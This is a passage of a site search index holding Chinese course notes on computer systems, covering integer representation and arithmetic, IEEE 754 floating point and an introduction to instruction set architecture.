\u5373\u4ece\u6709\u7b26\u53f7\u8f6c\u4e3a\u65e0\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u539f\u7801\u6765\u89e3\u8bfb\u539f\u6765\u8865\u7801\u7684\u4e8c\u8fdb\u5236 \u4ece\u65e0\u7b26\u53f7\u8f6c\u4e3a\u6709\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u8865\u7801\u89e3\u8bfb\u539f\u6765\u539f\u7801\u7684\u4e8c\u8fdb\u5236</p> \\[ T2U_w(x) = B2U_w(T2B_w(x)) \\] <p>\u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u539f\u7801\u548c\u8865\u7801\u53ea\u5dee\u4e86 MSB \u7684\u6743\u91cd\u4ece\u6b63\u5230\u8d1f\uff0c\u6240\u4ee5 \\(T2U_w(x) = x + x_{w-1}2^w\\)\uff0c\u4e5f\u5c31\u662f\uff1a</p> \\[ T2U_w(x) = \\begin{cases}x+2^w, &amp;x&lt;0\\\\x, &amp;x\\geq 0\\end{cases} \\] <p>\u5bf9\u4e8e\u65e0\u7b26\u53f7\u8f6c\u6709\u7b26\u53f7\uff1a</p> \\[ U2T_w(x) = B2T_w(U2B_w(x)) \\] <p>\u540c\u65f6\uff1a</p> \\[ U2T_w(x) = \\begin{cases}x, &amp;x\\leq TMax_w=2^{w-1}-1\\\\x-2^w, &amp;x &gt; TMax_w=2^{w-1}-1\\end{cases} \\]"},{"location":"cs/system/cs1/topic1/#_7","title":"\u6574\u6570\u8fd0\u7b97","text":""},{"location":"cs/system/cs1/topic1/#_8","title":"\u65e0\u7b26\u53f7\u6574\u578b\u52a0\u6cd5","text":"<p>\u5bf9\u4e8e\u4e24\u4e2a\u65e0\u7b26\u53f7\u6574\u578b \\(x, y\\in[0, 2^w)\\)\uff0c\u5b83\u4eec\u505a\u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u5728 \\(w+1\\) \u4f4d\u4e0b\u624d\u80fd\u5b8c\u5168\u8868\u793a\u51fa\u6765 \u4f46\u662f\u7ed3\u679c\u4e00\u5b9a\u8fd8\u8981\u8868\u793a\u5728 \\(w\\) \u4f4d\u4e0b\u8868\u793a\uff0c\u8fd9\u65f6\u5c31\u8981\u5bf9\u6ea2\u51fa\u90e8\u5206\u622a\u65ad\uff0c\u5373\u76f4\u63a5\u53bb\u6389\u6700\u9ad8\u4f4d</p> \\[ x+_w^\\mathrm{u}y = (x+y)\\bmod{2^w} \\] <p>\u5373\uff1a</p> \\[ x+_w^\\mathrm{u}y = \\begin{cases} x + y, &amp;x + y &lt; 2^w\\quad \\text{Normal}\\\\ x + y - 2^w, &amp;2^w\\leq x + y &lt; 2^{w + 1}\\quad \\text{Overflow} \\end{cases} \\]"},{"location":"cs/system/cs1/topic1/#_9","title":"\u65e0\u7b26\u53f7\u6574\u578b\u51cf\u6cd5","text":"<p>\u51cf\u6cd5\u5373\u52a0\u4e0a\u51cf\u6570\u53d6\u8d1f\uff0c\u6240\u4ee5\u53ea\u8981\u77e5\u9053\u5982\u4f55\u53d6\u8d1f\u5373\u53ef</p> <p>\u5bf9\u4e8e 0\uff0c\u53d6\u8d1f\u540e\u4e00\u5b9a\u4e5f\u4e3a 0 \u800c\u5bf9\u4e8e\u975e 0 \u6570\uff0c\u56e0\u4e3a\u53d6\u8d1f\u540e\u52a0\u4e0a\u539f\u6570\u4e3a 0\uff08\\(2^w\\) \u622a\u65ad\u540e\uff09\uff0c\u6240\u4ee5\u53d6\u8d1f\u5373\u7528 \\(2^w\\) \u51cf\u53bb\u539f\u6570\uff1a</p> \\[ -_w^\\mathrm{u}x = \\begin{cases}x, &amp;x=0\\\\2^w-x, &amp;x&gt;0\\end{cases} \\]"},{"location":"cs/system/cs1/topic1/#_10","title":"\u8865\u7801\u8868\u793a\u4e2d\u52a0\u6cd5","text":"<p>\u4f7f\u7528\u8865\u7801\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u8fdb\u884c\u52a0\u6cd5\u65f6\uff0c\u4f1a\u9047\u5230\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a</p> <ul> <li>\u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5927\uff0c\u8d85\u8fc7 \\(2^{w-1} - 1\\)\uff0c\u6b63\u6ea2\u51fa\uff08Positive overflow\uff09</li> <li>\u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5c0f\uff0c\u5c0f\u4e8e \\(-2^{w-1}\\)\uff0c\u8d1f\u6ea2\u51fa\uff08Negative overflow\uff09</li> </ul> <p>\u6240\u4ee5\u4e5f\u9700\u8981\u5bf9\u7ed3\u679c\u8fdb\u884c\u622a\u65ad\u5904\u7406\uff1a</p> \\[ x+_w^\\mathrm{t}y = \\begin{cases} x+y-2^w, &amp; 2^{w-1}\\leq x + y \\quad \\text{Positive overflow}\\\\ x+y, &amp;-2^{w-1}\\leq x+y &lt; 2^{w-1}\\quad \\text{Normal}\\\\ x+y+2^w, &amp;x+y &lt; -2^{w-1}\\quad \\text{Negative overflow} \\end{cases} \\] <p>\u4ece\u6bd4\u7279\u5e8f\u5217\u89d2\u5ea6\u6765\u770b\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u89c6\u4e3a\u4e8c\u8fdb\u5236\u5e8f\u5217\u76f8\u52a0\uff0c\u518d\u8f6c\u56de\u8865\u7801\u8868\u793a\u7684\u503c\uff1a</p> \\[ x+_w^\\mathrm{t}y=U2T_w(T2U_w(x)+_w^\\mathrm{u}T2U_w(y)) \\]"},{"location":"cs/system/cs1/topic1/#_11","title":"\u8865\u7801\u8868\u793a\u4e2d\u7684\u51cf\u6cd5","text":"<p>\u540c\u6837\uff0c\u4e5f\u662f\u53ea\u8003\u8651\u53d6\u8d1f\u5373\u53ef</p> <p>\u4f46\u662f\u548c\u539f\u7801\u4e0d\u540c\uff0c\u5b83\u672c\u8eab\u5c31\u5e26\u6b63\u8d1f\uff0c\u6240\u4ee5\u53d6\u8d1f\u5219\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\uff08\u5373\u53d6\u53cd\u52a0\u4e00\uff09 \u4f46\u6709\u4e00\u4e2a\u7279\u6b8a\uff0c\u4e5f\u5c31\u662f\u6700\u5c0f\u7684 \\(-2^{w-1}\\)\uff0c\u8d1f\u7684\u5b83 \\(2^{w-1}\\) \u5e76\u4e0d\u5728\u8865\u7801\u7684\u8303\u56f4\u4e2d</p> <p>\u800c \\(TMin_w+_w^\\mathrm{t}TMin_w=-2^{w-1}-2^{w-1}=-2^w\\)\uff0c\u622a\u65ad\u540e\u6070\u597d\u4e3a 0 \u6240\u4ee5 \\(-TMin_w = TMin_w\\)\uff0c\u5373\uff1a</p> \\[ -_w^\\mathrm{t}x = \\begin{cases} -2^{w-1}, &amp;x = -2^{w-1}\\\\ -x, &amp;x &gt; -2^{w-1} \\end{cases} \\]"},{"location":"cs/system/cs1/topic1/#_12","title":"\u4e58\u6cd5","text":"<p>\u6574\u578b\u7684\u4e58\u6cd5\u5747\u662f\u76f4\u63a5\u5c06\u539f\u7801/\u8865\u7801\u7684\u4e8c\u8fdb\u5236\u76f8\u4e58\uff0c\u7136\u540e\u76f4\u63a5\u622a\u65ad\u81f3 \\(w\\) \u4f4d</p> \\[ x*_w^\\mathrm{t}y = U2T_w(x*_w^\\mathrm{u}y) = U2T_w(x*y\\bmod 2^w) \\] <p>\u5e76\u4e14\u4e58\u4ee5\u5e38\u6570\u53ef\u4ee5\u901a\u8fc7\u79fb\u4f4d\u6765\u8fdb\u884c\uff0c\u6bd4\u5982\uff1a</p>  x * 2<sup>k</sup> = x &lt;&lt; k x * 14 = (x &lt;&lt; 3) + (x &lt;&lt; 2) + (x &lt;&lt; 1)"},{"location":"cs/system/cs1/topic1/#_13","title":"\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21","text":""},{"location":"cs/system/cs1/topic1/#unsigned","title":"Unsigned","text":"<p>\u65e0\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\u5219\u76f4\u63a5\u8fdb\u884c\u53f3\u79fb\uff1a</p> x / 2<sup>k</sup> = x &gt;&gt; k <p>\u5e76\u4e14\u662f\u5411\u4e0b\u53d6\u6574</p>"},{"location":"cs/system/cs1/topic1/#signed","title":"Signed","text":"<p>\u8865\u7801\u8868\u793a\u7684\u6709\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\uff0c\u8fdb\u884c\u6570\u503c\u53f3\u79fb\uff0c\u4f46\u662f\u76f4\u63a5\u53f3\u79fb\u8fdb\u884c\u7684\u662f\u5411\u4e0b\u53d6\u6574 \u800c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6574\u578b\u9664\u6cd5\u4e00\u822c\u8981\u5411 0 \u53d6\u6574\uff0c\u6240\u4ee5\u5bf9\u4e8e\u8d1f\u6570\u8981\u5411\u4e0a\u53d6\u6574</p> <p>\u5411\u4e0a\u53d6\u6574\u8981\u5148\u52a0\u4e0a\u4e00\u4e2a bias \u7136\u540e\u518d\u53f3\u79fb\uff0cbias = 2<sup>k</sup> - 1\uff0c\u5373 x / 2<sup>k</sup> \u5411\u4e0a\u53d6\u6574\u8981\u8fdb\u884c (x + (1 &lt;&lt; k) - 1) &gt;&gt; k</p> <p>\u6240\u4ee5\u5411 0 \u53d6\u6574\uff1a</p> (x &lt; 0 ? (x + (1 &lt;&lt; k) - 1) : x) &gt;&gt; k"},{"location":"cs/system/cs1/topic1/#_14","title":"\u6d6e\u70b9\u6570\u8868\u793a\u6cd5","text":"<p>\u524d\u9762\u7684\u6574\u578b\u90fd\u662f\u4e00\u79cd\u5b9a\u70b9\u6570\uff08fixed point\uff09\uff0c\u5373\u5c0f\u6570\u70b9\u7684\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff08\u56fa\u5b9a\u5728\u672b\u5c3e\uff09\uff0c\u5b83\u7684\u7f3a\u70b9\u662f\u8303\u56f4\u56fa\u5b9a</p> <p>\u800c\u6d6e\u70b9\u6570\uff08floating point\uff09\u7684\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5219\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u4f7f\u7528 \\(x*2^y\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\u4e00\u4e2a\u6570 \u4e5f\u56e0\u6b64\u53ef\u4ee5\u8868\u793a\u5f88\u5927\u6216\u8005\u5f88\u5c0f\u7684\u6570</p> <p>\u5e38\u7528\u7684\u6d6e\u70b9\u6570\u8868\u793a\u65b9\u6cd5\u662f\u7531 IEEE 754 \u6807\u51c6\u6307\u5b9a\u7684</p> <p>IEEE \u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u90fd\u901a\u8fc7 \\(V=(-1)^s\\times M\\times 2^E\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\uff0c\u5176\u4e2d\uff1a</p> <ul> <li>\\(s\\)\uff1a\u7b26\u53f7\uff08sign\uff09\uff0c1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u8868\u793a\u662f\u6b63\u6570</li> <li>\\(M\\)\uff1a\u5c3e\u6570\uff08mantissa\uff09\u6216\u79f0\u6709\u6548\u6570\u5b57\uff08significand\uff09</li> <li>\\(E\\)\uff1a\u6307\u6570\uff08exponent\uff09</li> </ul> <p>\u5b83\u4eec\u7684\u5b58\u50a8\u65b9\u5f0f\u662f\uff1a</p> <ul> <li>\u6700\u9ad8\u4f4d\u6bd4\u7279\u8868\u793a \\(s\\)</li> <li>\u540e\u63a5 \\(k\\) \u6bd4\u7279 \\([e_{k-1}\\cdots e_1e_0]\\) \u6307\u6570\u90e8\u5206\uff08\u4e5f\u79f0\u4e3a\u9636\u7801\uff09\u7f16\u7801\u4e86 \\(E\\)</li> <li>\u6700\u540e\u662f \\(n\\) \u4e2a\u6bd4\u7279 \\([f_{n-1}\\cdots f_1f_0]\\) \u5206\u6570\u90e8\u5206\uff0c\u7f16\u7801\u4e86 \\(M\\)</li> </ul> <p>\u5e76\u4e14\u6709\u4e24\u79cd\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u5373\uff1a</p> <ul> <li>\u5355\u7cbe\u5ea6\uff08single-precision floating-point\uff09\uff0c\\(k=8\\)\uff0c\\(n=23\\)\uff0c32 \u4f4d\uff084 \u5b57\u8282\uff09\u5b58\u50a8</li> <li>\u53cc\u7cbe\u5ea6\uff08double-precision floating-point\uff09\uff0c\\(k=11\\)\uff0c\\(n=52\\)\uff0c64 \u4f4d\uff088 \u5b57\u8282\uff09\u5b58\u50a8</li> </ul> <p>IEEE \u6d6e\u70b9\u6570\u503c\u8fd8\u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u4e0b\u9762\u5206\u522b\u63cf\u8ff0</p>"},{"location":"cs/system/cs1/topic1/#_15","title":"\u89c4\u7ea6\u5f62\u5f0f","text":"<p>\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684\u9636\u7801\u4e0d\u5168\u4e3a 0 \u4e5f\u4e0d\u5168\u4e3a 1\uff0c\u662f\u6700\u5e38\u89c1\u7684\u5f62\u5f0f \u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c\u800c \\(E\\)\u3001\\(M\\) \u7684\u89c4\u5219\uff1a</p> <ul> <li>\\(E\\) \u901a\u8fc7\u79fb\u7801\uff08biased\uff09\u8868\u793a\u6210\u9636\u7801 \\([e_{k-1}\\cdots e_1e_0]\\)\uff0c\u79fb\u4f4d \\(Bias = 2^{k-1}-1\\)\uff0c\\(E = e - Bias\\)\uff08\u5176\u4e2d \\(e\\) \u4e3a\u5c06\u9636\u7801\u8f6c\u4e3a\u65e0\u7b26\u53f7\u6574\u578b\u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u9636\u7801\u90e8\u5206\u8303\u56f4\u4ece \\([1, 2^k-2]\\) \u53d8\u4e3a \\([-2^{k-1}+2, 2^{k-1}-1]\\)</li> <li>\\(M = 1+f\\)\uff0c\u5176\u4e2d \\(f = 0.f_{n-1}\\cdots f_1f_0\\in[0, 1)\\)\uff0c\u56e0\u6b64 \\(M=1.f_{n-1}\\cdots f_1f_0\\in[1, 2)\\)</li> </ul> <p>\u8ba1\u7b97\u540e\u518d\u901a\u8fc7 \\(V = (-1)^s\\times M\\times 2^E\\) \u5373\u53ef\u8ba1\u7b97\u51fa\u6240\u8868\u793a\u7684\u503c</p> <p>\u89c4\u7ea6\u5f62\u5f0f\u53ef\u4ee5\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u4e14\u8d8a\u63a5\u8fd1 0 \u8d8a\u5bc6\u96c6</p> <p>\u5728\u89c4\u7ea6\u5f62\u5f0f\u4e0b\u53ef\u4ee5\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a</p> <ul> <li>\u5355\u7cbe\u5ea6<ul> <li>\u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09\\(1\\times 2^{-126}\\)\uff08\\(1.2\\times 10^{-38}\\)\uff09</li> <li>\u6700\u5927\u6b63\uff080 1...10 1...11\uff09\\((2-2^{-23})\\times 2^{127}\\)\uff08\\(3.4\\times 10^{38}\\)\uff09</li> </ul> </li> <li>\u53cc\u7cbe\u5ea6<ul> <li>\u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09\\(1\\times 2^{-1022}\\)\uff08\\(2.2\\times 10^{-308}\\)\uff09</li> <li>\u6700\u5927\u6b63\uff080 1...10 1...11\uff09\\((2-2^{-52})\\times 2^{1023}\\)\uff08\\(1.8\\times 10^{308}\\)\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs1/topic1/#_16","title":"\u975e\u89c4\u7ea6\u5f62\u5f0f","text":"<p>\u5728\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u9636\u7801\u5168\u4e3a 0\uff0c\u8fd9\u79cd\u5f62\u5f0f\u7684\u76ee\u7684\u662f\u8868\u793a 0 \u4ee5\u53ca\u63a5\u8fd1 0 \u7684\u503c \u540c\u6837 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c\\(E\\)\u3001\\(M\\)\uff1a</p> <ul> <li>\\(E = 1 - Bias = -2^{k-1} + 2\\)</li> <li>\\(M = f = 0.f_{n-1}\\cdots f_1f_0\\)</li> </ul> <p>\u800c\u5728\u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u4e0b\uff0c0 \u6709\u4e24\u79cd\uff0c\u5373 \\(s=0\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 +0.0\uff0c\u4ee5\u53ca \\(s=1\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 -0.0 \u5b83\u4eec\u6709\u65f6\u89c6\u4e3a\u76f8\u7b49\uff0c\u4f46\u4e5f\u6709\u65f6\u4f1a\u89c6\u4e3a\u4e0d\u76f8\u7b49</p> <p>\u975e\u89c4\u7ea6\u5f62\u5f0f\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e00\u81f4\u7684\uff0c\u5b83\u4eec\u7684\u95f4\u8ddd\u4e5f\u5c31\u662f\u7528\u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6700\u5c0f\u6b63\u6570 \\(2^{-n}\\times 2^{-2^{k-1}+2}\\)</p> <p>\u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a</p> <ul> <li>\u5355\u7cbe\u5ea6<ul> <li>\u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09\\(2^{-23}\\times 2^{-126}\\)\uff08\\(1.4\\times 10^{-45}\\)\uff09</li> <li>\u6700\u5927\u6b63\uff080 0...00 1...11\uff09\\((1-2^{-23})\\times 2^{126}\\)\uff08\\(1.2\\times 10^{38}\\)\uff09</li> </ul> </li> <li>\u53cc\u7cbe\u5ea6<ul> <li>\u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09\\(2^{-52}\\times 2^{-1022}\\)\uff08\\(4.9\\times 10^{-324}\\)\uff09</li> <li>\u6700\u5927\u6b63\uff080 0...00 1...11\uff09\\((1-2^{-52})\\times 2^{1022}\\)\uff08\\(2.2\\times 10^{-308}\\)\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs1/topic1/#_17","title":"\u7279\u6b8a\u503c","text":"<p>\u6d6e\u70b9\u6570\u4e5f\u53ef\u4ee5\u7528\u6765\u8868\u793a\u4e00\u4e9b\u7279\u6b8a\u503c\uff0c\u5373 \\(+\\infty\\)\u3001\\(-\\infty\\) \u4ee5\u53ca NaN\uff08not a number\uff09 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u9636\u7801\u5168\u4e3a 1\uff0c\u5177\u4f53\u4e09\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=0\\)\uff0c\u8868\u793a \\(+\\infty\\)</li> <li>\u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=1\\)\uff0c\u8868\u793a \\(-\\infty\\)</li> <li>\u5206\u6570\u90e8\u5206\u4e0d\u5168\u4e3a 0\uff0c\u8868\u793a NaN</li> </ul>"},{"location":"cs/system/cs1/topic1/#_18","title":"\u820d\u5165","text":"<p>\u820d\u5165\uff08rounding\uff09\u6709\u56db\u79cd\uff1a\u5411\u5076\u820d\u5165\uff08round-to-even\uff09\u3001\u5411 0 \u820d\u5165\uff08round-toward-zero\uff09\u3001\u5411\u4e0b\u820d\u5165\uff08round-down\uff09\u3001\u5411\u4e0a\u820d\u5165\uff08round-up\uff09 \u9ed8\u8ba4\u662f round-to-even</p> <p>\u5982\u679c\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5c0f\u6570\uff1aX...XX.Y...Yabcd...\uff0c\u8981\u820d\u5165\u5230 a \u7684\u4f4d\u7f6e</p> <ul> <li>\u5982\u679c bcd \u5c0f\u4e8e 100<sub>2</sub>\uff0c\u5219\u76f4\u63a5\u820d\u53bb bcd</li> <li>\u5982\u679c bcd \u5927\u4e8e 100<sub>2</sub>\uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d</li> <li>\u5982\u679c bcd \u7b49\u4e8e 100<sub>2</sub><ul> <li>\u5982\u679c a \u4e3a 0\uff08\u5076\uff09\uff0c\u5219\u820d\u53bb bcd</li> <li>\u5982\u679c a \u4e3a 1\uff08\u5947\uff09\uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d</li> </ul> </li> </ul>"},{"location":"cs/system/cs1/topic1/#_19","title":"\u6d6e\u70b9\u6570\u52a0\u6cd5","text":"<p>\u4f1a\u5b58\u5728\u820d\u5165\u95ee\u9898</p> <p>\u662f\u963f\u8d1d\u5c14\u7fa4\uff0c\u6ee1\u8db3\u4ea4\u6362\u5f8b\uff0c\u4f46\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b</p>"},{"location":"cs/system/cs1/topic2/","title":"\u6570\u5b57\u903b\u8f91\u57fa\u7840","text":"<p> \u7ea6 51 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e09\uff5e\u4e94\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>Computer Organization and Design: The Hardware/Software Interface (RISC-V edition) Appendix A: The Basics of Logic Design</li> <li>\u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09</li> </ul>"},{"location":"cs/system/cs1/topic3/","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def","text":"<p> \u7ea6 22 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e94\uff5e\u516b\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p>"},{"location":"cs/system/cs1/topic4/","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def","text":"<p> \u7ea6 22 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u516b\uff5e\u5341\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p>"},{"location":"cs/system/cs1/topic5/","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784","text":"<p> \u7ea6 2536 \u4e2a\u5b57  30 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e00\uff5e\u5341\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09 \u7b2c\u4e5d\u7ae0\u3001\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784</li> </ul>"},{"location":"cs/system/cs1/topic5/#isa","title":"ISA \u6982\u5ff5","text":""},{"location":"cs/system/cs1/topic5/#_2","title":"\u6307\u4ee4","text":"<p>\u6307\u4ee4\uff08instruction\uff09= \u64cd\u4f5c\u7b26\uff08opcode\uff09+ \u64cd\u4f5c\u6570\uff08operand\uff09</p> <p>\u6307\u4ee4\u683c\u5f0f\u5305\u542b\u957f\u5ea6\u3001\u64cd\u4f5c\u6570\u4e2a\u6570\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u3001\u5bfb\u5740\u5185\u5b58\u5927\u5c0f\u3001\u5bfb\u5740\u6a21\u5f0f\u7b49</p>"},{"location":"cs/system/cs1/topic5/#_3","title":"\u6307\u4ee4\u96c6","text":"<p>CPU \u53ef\u4ee5\u201c\u7406\u89e3\u201d\u7684\u4e00\u7cfb\u5217\u6307\u4ee4\uff0c\u4ee5\u4e8c\u8fdb\u5236\u673a\u5668\u7801\uff08machine code\uff09\u7684\u5f62\u5f0f\u8868\u73b0</p>"},{"location":"cs/system/cs1/topic5/#_4","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784","text":"<p>\u89c4\u5b9a\u4e86\u6240\u6709\u786c\u4ef6\u5b9e\u73b0\u7684\u6307\u4ee4\u3001\u89c4\u5b9a\u4e86\u6307\u4ee4\u7b26\u53f7\u540d\u79f0\u3001\u4e8c\u8fdb\u5236\u7f16\u7801\u683c\u5f0f\uff0c\u63d0\u4f9b\u4e86\u6bcf\u6761\u6307\u4ee4\u7cbe\u786e\u5b9a\u4e49\u7684\u201d\u624b\u518c\u201c\u5373\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\uff08ISA\uff0cInstruction Set Architecture\uff09</p> <p>\u8ba1\u7b97\u673a\u6839\u636e ISA \u5b9e\u73b0\uff0cISA \u53ef\u4ee5\u6709\u591a\u79cd\u5b9e\u73b0\u3001ISA \u4f7f\u8f6f\u4ef6\u53ef\u4ee5\u64cd\u7eb5\u786c\u4ef6\u3001ISA \u5b9a\u4e49\u4e86\u673a\u5668\u8bed\u8a00\uff0cISA \u89c4\u5b9a\u4e86\u5fae\u5904\u7406\u5668\uff08microprocessor\uff09\u7684\u8bbe\u8ba1\uff08ISA \u5b9a\u4e49\u4e86 CPU \u6216\u8005\u4e00\u7c7b CPU\uff0c\u5b83\u5305\u542b CPU \u7684\u5185\u5b58\u89c6\u56fe\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u7b49\u4fe1\u606f\uff0c\u800c\u4e0d\u53ea\u662f\u4e00\u7cfb\u5217\u6307\u4ee4\u7684\u96c6\u5408\uff09</p> <p>\u6ce8\uff1a\u4f53\u7cfb\u7ed3\u6784\u8986\u76d6\u6574\u4e2a\u8ba1\u7b97\u673a\uff0c\u5305\u62ec ISA\u3001\u7ec4\u6210\u548c\u786c\u4ef6\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f ISA\u3002ISA \u4e5f\u4e0d\u662f CPU \u7684\u4f53\u7cfb\u7ed3\u6784\uff08\u540c\u4e00 ISA \u6709\u4e0d\u540c\u79cd CPU\uff09</p>"},{"location":"cs/system/cs1/topic5/#isa_1","title":"ISA \u8bbe\u8ba1","text":""},{"location":"cs/system/cs1/topic5/#_5","title":"\u8bbe\u8ba1\u539f\u5219","text":""},{"location":"cs/system/cs1/topic5/#_6","title":"\u6307\u4ee4\u683c\u5f0f\u8bbe\u8ba1\u539f\u5219","text":"<ul> <li>\u6307\u4ee4\u957f\u5ea6\u8981\u77ed</li> <li>\u4e3a\u65b0\u7684 opcode \u7559\u51fa\u8db3\u591f\u7a7a\u95f4</li> <li>\u6709\u533a\u5206\u6027\u7684\u7f16\u7801</li> <li>\u8bbe\u8ba1\u597d\u64cd\u4f5c\u6570\u7684\u4e2a\u6570</li> <li>\u8bbe\u8ba1\u597d\u6307\u4ee4\u7684\u5bf9\u9f50\u6a21\u5f0f</li> <li>\u4fdd\u6301\u89c4\u8303\u5316</li> </ul>"},{"location":"cs/system/cs1/topic5/#isa_2","title":"ISA \u8bbe\u8ba1\u539f\u5219","text":"<ul> <li>Simplicity favors regularity</li> <li>Make the common case fast</li> <li>Smaller is faster</li> <li>Good design demands good compromises</li> </ul>"},{"location":"cs/system/cs1/topic5/#_7","title":"\u64cd\u4f5c\u6570","text":""},{"location":"cs/system/cs1/topic5/#_8","title":"\u64cd\u4f5c\u6570\u4e2a\u6570","text":"<p>\u4e00\u822c\u6ca1\u6709 4 \u4e2a\u6216\u4ee5\u4e0a\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\uff0c\u8fd9\u6837\u6bcf\u4e2a\u64cd\u4f5c\u6570\u4e0d\u4e00\u5b9a\u90fd\u4f1a\u7528\u4e0a\uff0c\u800c\u4e14\u4f1a\u589e\u52a0 CPU \u7684\u590d\u6742\u5ea6\uff0c\u5e76\u4e14\u4f7f\u6307\u4ee4\u53d8\u957f</p> <p>\u5927\u90e8\u5206\u6307\u4ee4\u96c6\u5747\u6709 0/1/2/3 \u4e2a\u64cd\u4f5c\u6570\u3002\u4e0b\u9762\u4ee5\u8ba1\u7b97 Y = (A - B) / (C + (D * E)) \u4e3a\u4f8b\u5b50</p>"},{"location":"cs/system/cs1/topic5/#_9","title":"\u4e09\u64cd\u4f5c\u6570\u6307\u4ee4","text":"<p>\u53ef\u4ee5\u6709\u4e24\u4e2a\u6e90\u64cd\u4f5c\u6570\u548c\u4e00\u4e2a\u76ee\u7684\u64cd\u4f5c\u6570 <pre><code>SUB R1, A, B\nMUL R2, D, E\nADD R2, R2, C\nDIV R1, R1, R2\n</code></pre> 